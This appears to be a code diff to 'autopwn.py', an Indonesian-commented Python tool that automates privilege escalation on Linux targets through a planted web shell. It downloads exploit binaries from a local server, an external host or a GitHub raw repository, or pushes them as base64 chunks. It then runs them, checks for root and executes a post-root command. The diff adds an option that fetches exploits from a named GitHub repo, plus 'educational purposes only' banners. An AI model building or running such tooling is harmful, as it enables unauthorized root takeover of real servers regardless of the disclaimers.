@@ -8,6 +8,7 @@ Alur per target (semua lewat POST cmd ke shell):
          -> checker-first -> upload biner PoC -> eksekusi -> verifikasi root -> log.
 
 HANYA UNTUK TARGET TERAUTORISASI (lab sendiri / CTF / pentest berizin).
+EDUCATIONAL PURPOSES ONLY — pendidikan & riset keamanan terautorisasi.
 Scanner (lpescan.*) tetap read-only dan tidak pernah mengeksekusi PoC;
 yang mengeksekusi PoC adalah tool ini (attacker-side) dan HANYA terhadap
 target yang diberikan lewat --shell. Target produksi: wajib --production
@@ -19,6 +20,7 @@ Contoh:
   python3 autopwn.py --shell URL --scan-only       # hanya scan + PLAN.md
   python3 autopwn.py --shell URL --allow-backported # BP: checker-stage saja
   python3 autopwn.py --fetch-base http://host/dir  # biner dari hosting eksternal
+  python3 autopwn.py --github                      # biner dari repo GitHub (raw)
   python3 autopwn.py --selftest                    # gate offline
 
 Catatan teknis:
@@ -239,12 +241,13 @@ class FileServer:
         self.thread.start()
         self.started = True
 
-    def add(self, local_path):
-        """Copy file ke dir serve, return URL absolutnya."""
-        name = os.path.basename(local_path)
-        dest = os.path.join(self.dir, name)
+    def add(self, local_path, rel_path=None):
+        """Copy file ke dir serve (struktur repo bila rel_path), return URL."""
+        rel = rel_path or os.path.basename(local_path)
+        dest = os.path.join(self.dir, rel)
+        os.makedirs(os.path.dirname(dest), exist_ok=True)
         shutil.copyfile(local_path, dest)
-        return f"{self.base}/{name}"
+        return fetch_url(self.base, rel)
 
     def close(self):
         try:
@@ -261,18 +264,26 @@ def _md5_remote(client, remote_path):
     return out.split()[0] if out and len(out.split()) >= 1 else None
 
 
-def deliver(client, local_path, remote_path, server=None, fetch_base=None, log=print):
+def fetch_url(fetch_base, repo_rel):
+    """URL penuh untuk path relatif repo (mis. raw.githubusercontent.com)."""
+    path = "/".join(urllib.parse.quote(seg, safe="") for seg in repo_rel.split("/"))
+    return fetch_base.rstrip("/") + "/" + path
+
+
+def deliver(client, local_path, remote_path, server=None, fetch_base=None,
+            repo_rel=None, log=print):
     """Kirim file ke target: 1) fetch dari URL (server lokal/eksternal),
     2) fallback chunk base64 via echo|base64 -d. Verifikasi md5sum."""
     want = md5_local(local_path)
+    rel = repo_rel or os.path.basename(local_path)
     url = None
     if server is not None:
         try:
-            url = server.add(local_path)
+            url = server.add(local_path, rel)
         except Exception as e:
             log(f"    [!] gagal add ke serve dir: {e}")
     elif fetch_base:
-        url = fetch_base.rstrip("/") + "/" + os.path.basename(local_path)
+        url = fetch_url(fetch_base, rel)
     if url:
         try:
             client.exec(
@@ -417,7 +428,8 @@ def deploy_scanner(client, stage, flavor, opts, server, log):
                              f"(jalankan build-scanner.py)")
         log(f"    kirim {name} ({os.path.getsize(local)} B)")
         deliver(client, local, f"{stage}/{name}", server=server,
-                fetch_base=opts.fetch_base, log=log)
+                fetch_base=opts.fetch_base, repo_rel=f"lpescan/dist/{name}",
+                log=log)
     log("  [scan] menjalankan scanner di target...")
     rc, tail = run_bg(client, stage, scan_cmd, "scan", timeout=opts.scan_timeout,
                       poll=opts.poll, log=log)
@@ -534,7 +546,9 @@ def execute_phase(client, stage, sel, opts, facts, log, ev_add):
         vuln_confirmed = False
         if chk_local:
             deliver(client, chk_local, f"{stage}/{os.path.basename(chk_local)}",
-                    server=opts.server, fetch_base=opts.fetch_base, log=log)
+                    server=opts.server, fetch_base=opts.fetch_base,
+                    repo_rel=f"cve-lpe/pocs/bin/{os.path.basename(chk_local)}",
+                    log=log)
             client.exec(f"chmod +x {stage}/{os.path.basename(chk_local)}")
             try:
                 _, cout = run_bg(client, stage,
@@ -561,7 +575,9 @@ def execute_phase(client, stage, sel, opts, facts, log, ev_add):
             log(f"    [skip] {cid} BP tanpa konfirmasi checker")
             continue
         deliver(client, exp_local, f"{stage}/{os.path.basename(exp_local)}",
-                server=opts.server, fetch_base=opts.fetch_base, log=log)
+                server=opts.server, fetch_base=opts.fetch_base,
+                repo_rel=f"cve-lpe/pocs/bin/{os.path.basename(exp_local)}",
+                log=log)
         client.exec(f"chmod +x {stage}/{os.path.basename(exp_local)}")
         stdin = base64.b64decode(recipe["stdin_b64"])
         try:
@@ -761,7 +777,12 @@ def selftest():
     t("md5_local", md5_local(tmp) == hashlib.md5(b"abc").hexdigest())
     os.remove(tmp)
 
-    # 8. gate produksi
+    # 8. fetch_url (mapping path repo -> raw URL)
+    t("fetch_url", fetch_url("https://raw.githubusercontent.com/u/r/main",
+                             "lpescan/dist/lpescan.py")
+      == "https://raw.githubusercontent.com/u/r/main/lpescan/dist/lpescan.py")
+
+    # 9. gate produksi
     class OP:
         pass
     op = OP()
@@ -820,6 +841,16 @@ def main(argv=None):
                     help="command dijalankan root setelah sukses")
     ap.add_argument("--fetch-base", default=None,
                     help="URL dasar hosting eksternal biner (mis. R2 presigned)")
+    ap.add_argument("--github", action="store_true",
+                    help="ambil scanner+biner langsung dari repo GitHub "
+                         "(raw.githubusercontent; fallback chunk bila target "
+                         "tanpa internet)")
+    ap.add_argument("--github-user", default="kevinpratama102",
+                    help="user GitHub untuk --github (default kevinpratama102)")
+    ap.add_argument("--github-repo", default="AutoRoot",
+                    help="repo untuk --github (default AutoRoot)")
+    ap.add_argument("--github-branch", default="main",
+                    help="branch untuk --github (default main)")
     ap.add_argument("--no-serve", dest="serve", action="store_false",
                     help="matikan HTTP server lokal (hanya chunk base64)")
     ap.add_argument("--keep", action="store_true",
@@ -849,9 +880,15 @@ def main(argv=None):
         return 3
     # post-root-cmd masuk ke dalam double quote pada route su_patched
     args.post_root_cmd = args.post_root_cmd.replace('"', '')
+    if args.github:
+        if args.fetch_base:
+            ap.error("--github dan --fetch-base tidak bisa digabung")
+        args.fetch_base = (f"https://raw.githubusercontent.com/"
+                           f"{args.github_user}/{args.github_repo}/{args.github_branch}")
 
     print("=" * 66)
     print("autopwn — otomasi LPE lab (scan -> biner PoC -> eksekusi)")
+    print("EDUCATIONAL PURPOSES ONLY — target terautorisasi saja.")
     print(f"versi {VERSION} | target: {len(args.shell)} shell | "
           f"max-exploits {args.max_exploits} | allow-backported: "
           f"{'YA' if args.allow_backported else 'TIDAK'}")
